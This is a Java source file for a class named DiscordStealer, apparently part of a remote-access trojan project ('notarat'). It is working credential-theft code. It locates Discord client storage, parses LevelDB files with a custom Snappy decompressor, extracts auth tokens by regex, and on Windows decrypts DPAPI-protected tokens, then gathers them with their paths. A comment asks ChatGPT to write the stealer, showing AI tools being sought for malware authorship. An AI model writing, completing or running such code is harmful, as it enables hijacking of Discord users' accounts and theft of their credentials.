package dev.xotic.notarat.apps;

import dev.xotic.notarat.crypto.WinDpapi;
import dev.xotic.notarat.util.PathUtil;

import java.io.File;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public final class DiscordStealer {
// chatgpt, generate me a discord stealer java code, make no mistakes, you got this bro, please dont hallucinate, you can do it, i trust you ദ്ദി(•̀ ᴗ - ˵)
    private static final Pattern TOKEN =
            Pattern.compile("[MN][A-Za-z\\d]{23,26}\\.[\\w-]{6}\\.[\\w-]{27,40}");

    private static final Pattern DPAPI_BLOB =
            Pattern.compile("dQw4w9WgXcQ:([A-Za-z0-9+/=]+)");

    private static final long LDB_MAGIC = 0xdb4775248b80fb57L;

    private static final boolean DEBUG = Boolean.getBoolean("notarat.debug");

    public List<Map<String, String>> dump() {
        List<Map<String, String>> rows = new ArrayList<>();
        Set<String> seen = new LinkedHashSet<>();

        for (File appRoot : PathUtil.discordStorageDirs()) {
            String client = labelFor(appRoot);
            File leveldb  = discoverLeveldb(appRoot);
            if (leveldb == null) {
                continue;
            }
            try {
                List<String> tokens = extractFrom(leveldb);

                for (String t : tokens) {
                    if (!seen.add(t)) continue;
                    Map<String, String> r = new LinkedHashMap<>();
                    r.put("app",    "Discord");
                    r.put("client", client);
                    r.put("path",   leveldb.getAbsolutePath());
                    r.put("token",  t);
                    rows.add(r);
                }
            } catch (Throwable ignored) {
            }
        }
        return rows;
    }

    private String labelFor(File root) {
        String n = root.getName().toLowerCase();
        if (n.contains("canary"))      return "canary";
        if (n.contains("ptb"))         return "ptb";
        if (n.contains("development")) return "development";
        return "stable";
    }

    private File discoverLeveldb(File appRoot) {
        File a = new File(appRoot, "Local Storage/leveldb");
        if (a.isDirectory()) return a;
        File b = new File(appRoot, "config/Local Storage/leveldb");
        if (b.isDirectory()) return b;

        return null;
    }
    private List<String> extractFrom(File leveldbDir) throws Exception {
        Set<String> tokens = new LinkedHashSet<>();
        File[] files = leveldbDir.listFiles();
        if (files == null) return new ArrayList<>();

        for (File f : files) {
            String name = f.getName().toLowerCase();
            byte[] data = Files.readAllBytes(f.toPath());

            if (name.endsWith(".ldb") || name.endsWith(".sst")) {
                for (byte[] block : readLdbBlocks(data)) scan(block, tokens);
            } else if (name.endsWith(".log")) {
                scan(data, tokens);
            }
        }
        return new ArrayList<>(tokens);
    }

    private void scan(byte[] buf, Set<String> out) {
        if (buf == null || buf.length == 0) return;
        String s = new String(buf, StandardCharsets.ISO_8859_1);

        Matcher m = TOKEN.matcher(s);
        while (m.find()) out.add(m.group());

        if (PathUtil.currentOS == PathUtil.OS.WINDOWS) {
            Matcher dm = DPAPI_BLOB.matcher(s);
            while (dm.find()) {
                try {
                    byte[] blob  = Base64.getDecoder().decode(dm.group(1));
                    byte[] plain = WinDpapi.unprotect(blob);
                    if (plain == null) continue;
                    String t = new String(plain, StandardCharsets.UTF_8).trim();
                    if (TOKEN.matcher(t).matches()) out.add(t);
                } catch (Throwable ignored) {}
            }
        }
    }

    private List<byte[]> readLdbBlocks(byte[] f) {
        List<byte[]> out = new ArrayList<>();
        if (f.length < 48) return out;

        long magic = 0L;
        for (int i = 0; i < 8; i++)
            magic |= (f[f.length - 8 + i] & 0xffL) << (8 * i);
        if (magic != LDB_MAGIC) return out;

        int[] p = { f.length - 48 };
        readVarint(f, p);
        readVarint(f, p);
        long idxOff  = readVarint(f, p);
        long idxSize = readVarint(f, p);

        byte[] index = readBlock(f, idxOff, idxSize);
        if (index == null || index.length < 5) return out;

        int end = index.length - 5;
        int[] ip = { 0 };
        byte[] lastKey = new byte[0];

        while (ip[0] < end) {
            long shared    = readVarint(index, ip);
            long nonShared = readVarint(index, ip);
            long valLen    = readVarint(index, ip);
            if (ip[0] + nonShared > end) break;

            byte[] key = new byte[(int)(shared + nonShared)];
            System.arraycopy(lastKey, 0, key, 0, (int) shared);
            System.arraycopy(index, ip[0], key, (int) shared, (int) nonShared);
            ip[0] += nonShared;
            lastKey = key;

            if (ip[0] + valLen > end) break;
            int[] vp = { ip[0] };
            long dataOff  = readVarint(index, vp);
            long dataSize = readVarint(index, vp);
            ip[0] += valLen;

            byte[] block = readBlock(f, dataOff, dataSize);
            if (block != null) out.add(block);
        }
        return out;
    }

    private byte[] readBlock(byte[] f, long off, long size) {
        if (size < 5) return null;
        if (off < 0 || off + size > f.length) return null;

        int len  = (int)(size - 5);
        int type = f[(int)(off + size - 5)] & 0xff;

        byte[] buf = new byte[len];
        System.arraycopy(f, (int) off, buf, 0, len);

        if (type == 0x00) return buf;
        if (type == 0x01) return snappy(buf);
        return null;
    }

    private static byte[] snappy(byte[] in) {
        if (in == null || in.length == 0) return null;
        int[] p = { 0 };
        long ulen = readVarint(in, p);
        if (ulen <= 0 || ulen > (64L * 1024 * 1024)) return null;

        byte[] out = new byte[(int) ulen];
        int op = 0;

        while (p[0] < in.length && op < out.length) {
            int tag  = in[p[0]++] & 0xff;
            int type = tag & 0x03;

            if (type == 0) {
                int l = tag >>> 2;
                if (l < 60) {
                    l += 1;
                } else {
                    int extra = l - 59;
                    l = 0;
                    for (int i = 0; i < extra; i++) l |= (in[p[0]++] & 0xff) << (8 * i);
                    l += 1;
                }
                if (op + l > out.length || p[0] + l > in.length) break;
                System.arraycopy(in, p[0], out, op, l);
                p[0] += l; op += l;

            } else if (type == 1) {
                int l = ((tag >>> 2) & 0x07) + 4;
                int d = ((tag >>> 5) << 8) | (in[p[0]++] & 0xff);
                op = copyRun(out, op, d + 1, l);

            } else if (type == 2) {
                int l = (tag >>> 2) + 1;
                int d = (in[p[0]++] & 0xff) | ((in[p[0]++] & 0xff) << 8);
                op = copyRun(out, op, d + 1, l);

            } else {
                int l = (tag >>> 2) + 1;
                int d = (in[p[0]++] & 0xff) | ((in[p[0]++] & 0xff) << 8)
                        | ((in[p[0]++] & 0xff) << 16) | ((in[p[0]++] & 0xff) << 24);
                op = copyRun(out, op, d + 1, l);
            }
        }
        return (op == out.length) ? out : Arrays.copyOf(out, op);
    }

    private static int copyRun(byte[] out, int op, int dist, int len) {
        if (dist <= 0 || op - dist < 0) return op;
        if (op + len > out.length) len = out.length - op;
        for (int i = 0; i < len; i++) out[op + i] = out[op - dist + i];
        return op + len;
    }

    private static long readVarint(byte[] b, int[] pos) {
        long r = 0;
        int shift = 0;
        while (pos[0] < b.length && shift <= 63) {
            int c = b[pos[0]++] & 0xff;
            r |= (long)(c & 0x7f) << shift;
            if ((c & 0x80) == 0) return r;
            shift += 7;
        }
        return r;
    }

    public DiscordStealer() {}
}